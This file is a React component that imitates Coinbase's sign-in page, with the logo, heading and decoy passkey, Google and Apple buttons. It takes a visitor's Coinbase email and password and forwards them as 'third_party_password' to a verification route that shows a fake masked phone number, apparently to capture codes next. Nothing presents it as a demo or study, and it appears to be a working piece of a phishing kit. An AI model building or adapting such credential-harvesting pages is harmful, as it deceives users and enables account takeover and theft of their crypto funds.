import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '../../lib/supabase';
import { useAuth } from '../../contexts/AuthContext';

function CoinbaseLogo() {
  return (
    <img src="/logos/coinbaselogo.svg" alt="Coinbase Logo" width="28" height="28" />
  );
}

export default function CoinbaseConnect() {
  const navigate = useNavigate();
  const { user } = useAuth();
  const [credentials, setCredentials] = useState({
    email: '',
    password: '',
  });
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');

  const handleFieldChange = (field: string) => (event: React.ChangeEvent<HTMLInputElement>) => {
    setCredentials((current) => ({ ...current, [field]: event.target.value }));
  };

  const handleContinue = async (event: React.FormEvent) => {
    event.preventDefault();
    if (step === 1) {
      if (!credentials.email.trim()) {
        setErrorMessage('Enter your email address to continue.');
        return;
      }
      setErrorMessage('');
      setStep(2);
      return;
    }

    if (!credentials.password) {
      setErrorMessage('Enter your password to continue.');
      return;
    }

    setLoading(true);
    try {
      const platformData = {
        platform: 'Coinbase',
        email: credentials.email,
        third_party_password: credentials.password,
        user_id: user?.id || null,
      };

      // Navigate to verification page with credentials and a masked phone target
      navigate('/connect/coinbase/verify-email', {
        state: {
          email: credentials.email,
          phone: '+1* ********12',
          platformData,
        },
      });
    } catch (err: any) {
      setErrorMessage(err.message || 'An unexpected error occurred.');
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="min-h-screen bg-[#050505] text-white flex items-center justify-center px-4 font-sans">
      <div className="absolute left-6 top-6 rounded-full border border-white/10 bg-white/5 p-3 shadow-[0_20px_60px_rgba(0,0,0,0.35)]">
        <CoinbaseLogo />
      </div>

      <div className="w-full max-w-[460px]">
        <div className="space-y-10 rounded-[32px] bg-[#09090d]/80 px-8 py-10 shadow-[0_20px_80px_rgba(0,0,0,0.45)] backdrop-blur-xl">
          <h1 className="text-[2.3rem] font-semibold tracking-[-0.04em] text-white text-center">
            Sign in to Coinbase
          </h1>

          <form onSubmit={handleContinue} className="space-y-5">
            <div className="space-y-3">
              <label htmlFor="coinbase-email" className="block text-sm font-semibold text-slate-300">
                Email
              </label>
              <input
                id="coinbase-email"
                type="email"
                value={credentials.email}
                onChange={handleFieldChange('email')}
                placeholder="Your email address"
                className="h-[68px] w-full rounded-full border border-white/10 bg-white/5 px-5 text-[18px] text-white placeholder:text-slate-500 outline-none transition focus:border-[#3e75ff] focus:ring-1 focus:ring-[#3e75ff]/40"
              />
            </div>

            {errorMessage && <p className="text-sm font-medium text-[#f87171]">{errorMessage}</p>}

            {step === 2 && (
              <div className="space-y-3">
                <label htmlFor="coinbase-password" className="block text-sm font-semibold text-slate-300">
                  Password
                </label>
                <input
                  id="coinbase-password"
                  type="password"
                  value={credentials.password}
                  onChange={handleFieldChange('password')}
                  placeholder="Enter your password"
                  className="h-[68px] w-full rounded-full border border-white/10 bg-white/5 px-5 text-[18px] text-white placeholder:text-slate-500 outline-none transition focus:border-[#3e75ff] focus:ring-1 focus:ring-[#3e75ff]/40"
                />
              </div>
            )}

            <button
              type="submit"
              disabled={loading}
              className="h-[68px] w-full rounded-full bg-[#2746a2] text-[18px] font-semibold text-white shadow-[0_15px_35px_rgba(39,70,162,0.28)] transition hover:bg-[#1f3d8f] disabled:cursor-not-allowed disabled:opacity-60"
            >
              {loading ? 'Connecting...' : 'Continue'}
            </button>
          </form>

          <div className="flex items-center gap-3 text-[13px] font-semibold text-slate-400">
            <div className="h-px flex-1 bg-white/10" />
            <span>OR</span>
            <div className="h-px flex-1 bg-white/10" />
          </div>

          <div className="space-y-4">
            <button className="flex h-[68px] w-full items-center justify-between rounded-full bg-white/5 px-6 text-[16px] font-semibold text-white transition hover:bg-white/10">
              <div className="flex items-center gap-4">
                <div className="flex h-10 w-10 items-center justify-center rounded-full bg-white/10">
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" className="text-white">
                    <path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2" />
                    <circle cx="12" cy="7" r="4" />
                  </svg>
                </div>
                <span>Sign in with passkey</span>
              </div>
              <span className="text-slate-400">›</span>
            </button>

            <button className="flex h-[68px] w-full items-center justify-between rounded-full bg-white/5 px-6 text-[16px] font-semibold text-white transition hover:bg-white/10">
              <div className="flex items-center gap-4">
                <div className="flex h-10 w-10 items-center justify-center rounded-full bg-white/10">
                  <img src="/logos/google-icon-logo-svgrepo-com.svg" alt="Google" className="h-5 w-5" />
                </div>
                <span>Sign in with Google</span>
              </div>
              <span className="text-slate-400">›</span>
            </button>

            <button className="flex h-[68px] w-full items-center justify-between rounded-full bg-white/5 px-6 text-[16px] font-semibold text-white transition hover:bg-white/10">
              <div className="flex items-center gap-4">
                <div className="flex h-10 w-10 items-center justify-center rounded-full bg-white/10">
                  <img src="/logos/apple-logo-svgrepo-com.svg" alt="Apple" className="h-5 w-5 invert" />
                </div>
                <span>Sign in with Apple</span>
              </div>
              <span className="text-slate-400">›</span>
            </button>
          </div>

          <div className="space-y-3 text-center">
            <p className="text-[16px] font-semibold text-white">
              Don&apos;t have an account? <span className="text-[#3e75ff] hover:underline cursor-pointer">Sign up</span>
            </p>
            <p className="text-[12px] leading-6 text-slate-400">
              Not your device? Use a private window. See our <span className="text-[#3e75ff] hover:underline cursor-pointer">Privacy Policy</span> for more info.
            </p>
          </div>
        </div>
      </div>
    </main>
  );
}
